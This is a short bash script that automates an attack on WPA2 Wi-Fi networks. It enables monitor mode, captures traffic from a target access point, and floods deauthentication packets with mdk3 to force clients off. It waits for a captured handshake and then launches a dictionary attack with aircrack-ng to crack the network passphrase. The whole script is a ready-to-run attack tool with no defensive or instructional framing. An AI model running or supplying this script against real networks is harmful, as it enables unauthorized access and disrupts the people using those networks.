read -p "Enter the network interface: " interface
echo ""
disablecard=$(airmon-ng stop $interface)
echo $disablecard
echo "Stopping the network card from the monitor mode"
sleep 2
echo "Enabling the network interface..."
checkp=$(airmon-ng check kill)
echo checkp
enablecard=$(airmon-ng start $interface)
echo $enablecard
sleep 2
read -p "Enter the mac address: " mac
read -p "Enter the channel: " channel
read -p "Enter the output filename: " outfile
read -p "Enter the dictionary filename: " dict
xterm -e "airodump-ng --bssid $mac -c $channel -w $outfile $interface & wait"&
mdk3 wlan0 d&
sleep 10
kill $(ps aux | grep 'mdk3' | awk '{print $2}')
sleep 4
echo "Waiting to record the handshakes..."
while true; do
  COWOUT=$(cowpatty -c -r $outfile"-01.cap")
  echo $COWOUT
  if [[ $COWOUT == *"Collected all necessary data to mount crack against WPA2/PSK passphrase"* ]]; then
    echo "What about the 4-way handshakes? Done"
    break
  fi
  sleep 3
done
kill $(ps aux | grep 'airodump' | awk '{print $2}')
xterm -hold -e "aircrack-ng $outfile-01.cap -w $dict & wait"
